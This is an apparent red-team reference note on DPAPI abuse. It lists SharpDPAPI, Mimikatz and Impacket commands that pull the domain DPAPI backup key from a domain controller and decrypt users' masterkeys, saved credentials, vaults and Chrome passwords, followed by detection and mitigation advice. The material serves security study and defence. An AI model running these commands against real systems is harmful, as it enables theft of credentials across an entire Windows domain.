---
title: DPAPI Abuse
aliases: ["DPAPI abuse", "DPAPI masterkey", "SharpDPAPI", "Domain DPAPI backup key"]
type: technique
domain: [red-team]
attack_tactic: [credential-access]
tags: [type/technique, domain/red-team, attack/credential-access]
source: "[[Source - harmj0y blog]]"
source_url: "https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/"
verified: true
related: ["[[Credential Storage in Windows]]", "[[Credential Hunting]]", "[[Attacking KeePass]]", "[[LSASS Dumping]]", "[[DCSync]]", "[[LSA Secrets]]"]
created: 2026-06-07
updated: 2026-06-07
---

# DPAPI Abuse

> [!summary] One-liner
> The Data Protection API encrypts most user secrets on Windows; recovering DPAPI masterkeys (per-user, per-machine, or via the domain backup key) decrypts those secrets at scale.

## Concept abused
**DPAPI** (`CryptProtectData` / `CryptUnprotectData`, exposed in .NET as `System.Security.Cryptography.ProtectedData`) is Windows' standard mechanism for encrypting secrets at rest — browser passwords, Credential Manager / Windows Vault entries, RDP `.rdg` saved credentials, Wi-Fi keys, scheduled-task credentials, the KeePass "Windows user account" key ([[Attacking KeePass]]), and arbitrary application secrets. Decryption requires the correct **masterkey**, and there are four scenarios to obtain one.

## Four masterkey decryption scenarios

| # | Scenario | Material needed | Scope |
|---|---|---|---|
| 1 | **User masterkey (password known)** | User's plaintext password + masterkey file from `%APPDATA%\Microsoft\Protect\<SID>\` | That user's secrets |
| 2 | **User masterkey (NTLM/SHA1 known)** | User's NT hash or SHA1 + masterkey file | Same — works when password is unknown but hash was dumped |
| 3 | **Domain backup key** | Domain DPAPI backup RSA key (retrieved from the DC) | **Any domain user's masterkeys** — domain-wide |
| 4 | **Machine masterkey** | `DPAPI_SYSTEM` LSA secret from `%SYSTEMROOT%\System32\Microsoft\Protect\` | Machine-scope secrets (System/NetworkService) |

> [!danger] The domain backup key is the crown jewel
> Every domain-joined user's masterkey has a copy encrypted to the **domain DPAPI backup key** (an RSA keypair stored on DCs). Retrieve it once with DA/DC access and you can **decrypt protected secrets for every user in the domain, offline, forever** — the key never rotates automatically.

## Where DPAPI-protected secrets live

| Secret type | Path / location |
|---|---|
| Credential Manager / Vault | `%APPDATA%\Microsoft\Credentials\` and `%LOCALAPPDATA%\Microsoft\Vault\` |
| Chrome cookies & passwords | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` (SQLite + DPAPI blob) |
| RDP `.rdg` saved creds | `%LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\` |
| Wi-Fi profiles | `%PROGRAMDATA%\Microsoft\Wlansvc\Profiles\Interfaces\` |
| Certificate private keys | `%APPDATA%\Microsoft\Crypto\RSA\` |

## Prerequisites
- Local access to target files (user/machine profile), **or** the user's password/NT hash, **or** the domain backup key for domain-wide offline decryption. Scenario 3 requires Domain Admin or equivalent (to extract the backup key from the DC).

## Commands & tools

### SharpDPAPI (GhostPack)
```powershell
# Triage: auto-decrypt reachable Credential Manager, Vault, Chrome, RDG blobs
SharpDPAPI.exe triage

# Decrypt specific masterkeys with a known password or NTLM hash
SharpDPAPI.exe masterkeys /target:<MASTERKEY_FILE> /password:<PASSWORD>
SharpDPAPI.exe masterkeys /target:<MASTERKEY_FILE> /ntlm:<NT_HASH>

# Retrieve the DOMAIN DPAPI backup key (requires DA or DC access)
SharpDPAPI.exe backupkey /nowrap

# Decrypt any user's masterkeys with the domain backup key (pvk file)
SharpDPAPI.exe masterkeys /pvk:<BACKUP_KEY.pvk>

# Targeted credential/vault/chrome decryption
SharpDPAPI.exe credentials /pvk:<BACKUP_KEY.pvk>
SharpDPAPI.exe vaults /pvk:<BACKUP_KEY.pvk>
SharpDPAPI.exe chrome /pvk:<BACKUP_KEY.pvk> /target:<USER_CHROME_PATH>
```

### Seatbelt (GhostPack — enumeration)
```powershell
# Enumerate DPAPI masterkey files and credential blobs (no decryption)
Seatbelt.exe -group=user
Seatbelt.exe WindowsCredentialFiles
Seatbelt.exe WindowsVault
```

### Mimikatz
```
# Decrypt a masterkey via the DC's backup key (RPC call — needs network to DC)
dpapi::masterkey /in:"<MASTERKEY_FILE>" /rpc

# Decrypt a masterkey with a known password/hash
dpapi::masterkey /in:"<MASTERKEY_FILE>" /password:<PASSWORD>
dpapi::masterkey /in:"<MASTERKEY_FILE>" /hash:<SHA1>

# Extract the DOMAIN backup key from a DC
lsadump::backupkeys /system:<DC_FQDN> /export

# Decrypt credential blobs
dpapi::cred /in:"<CREDENTIAL_BLOB>"

# Decrypt Chrome secrets
dpapi::chrome /in:"<LOGIN_DATA_PATH>" /unprotect
```

### Impacket
```bash
# Decrypt a masterkey with known password
dpapi.py masterkey -file <MASTERKEY_FILE> -sid <USER_SID> -password <PASSWORD>

# Decrypt a masterkey with domain backup key
dpapi.py masterkey -file <MASTERKEY_FILE> -pvk <BACKUP_KEY.pvk>

# Decrypt credential files
dpapi.py credential -file <CRED_FILE> -key <DECRYPTED_MASTERKEY_HEX>
```

## Offensive encrypted data storage (DPAPI edition)
harmj0y also demonstrated using DPAPI offensively to **protect the attacker's own operational data** so it can only be recovered in the intended context (e.g., only by that user on that machine). The `EncryptedStore.ps1` module provides:

```powershell
# Generate an RSA keypair, DPAPI-protect the private key
New-RSAKeyPair -PubKeyPath <PUB.xml> -PrivKeyPath <PRIV.enc>

# Write data: AES-CBC encrypts the payload, RSA wraps the AES key
Write-EncryptedStore -PubKeyPath <PUB.xml> -Payload "<DATA>" -StorePath <STORE.enc>

# Read data: DPAPI decrypts the RSA private key, which unwraps the AES key
Read-EncryptedStore -PrivKeyPath <PRIV.enc> -StorePath <STORE.enc>
```
The packet format is: `[RSA-encrypted AES key | IV | AES-CBC ciphertext]`. Because the RSA private key is DPAPI-protected, the store is bound to the user+machine context — portable only if the masterkey is also extracted.

## Detection / artifacts
- Access to `%APPDATA%\Microsoft\Protect\<SID>\` masterkey files from unexpected processes.
- **Event 4695** — DPAPI masterkey backup event on the DC (logged when a new masterkey is backed up; baseline these).
- Abnormal `lsadump::backupkeys` / `BackupKey` RPC calls to a DC (MS-BKRP protocol traffic).
- SharpDPAPI / Mimikatz `dpapi::` module process signatures; large-scale credential file reads from a single process.

## Mitigation
- Protect the domain DPAPI backup key as **Tier-0** — only DCs hold it; limit DA access.
- **Credential Guard** reduces what is recoverable from LSASS (prevents Scenario 1/2 in many cases).
- Least privilege — limit who can access other users' profile directories.
- Monitor backup-key RPC access and Event 4695 patterns.
- Avoid storing high-value secrets solely in DPAPI-backed stores when stronger alternatives exist (e.g., HSM-backed certificate stores).

## Related
- Underlying store concept: [[Credential Storage in Windows]] (DPAPI section).
- Machine masterkeys use [[LSA Secrets]] (`DPAPI_SYSTEM`).
- Often follows [[Credential Hunting]] to locate blobs; the KeePass "Windows account" key relies on DPAPI ([[Attacking KeePass]]).
- Domain backup key retrieval often uses [[DCSync]]-level access.

## Sources
- [[Source - harmj0y blog]] — "Operational Guidance for Offensive User DPAPI Abuse" — https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
- [[Source - harmj0y blog]] — "Offensive Encrypted Data Storage (DPAPI edition)" — https://blog.harmj0y.net/redteaming/offensive-encrypted-data-storage-dpapi-edition/
- [[Source - harmj0y blog]] — "Offensive Encrypted Data Storage" — https://blog.harmj0y.net/redteaming/offensive-encrypted-data-storage/
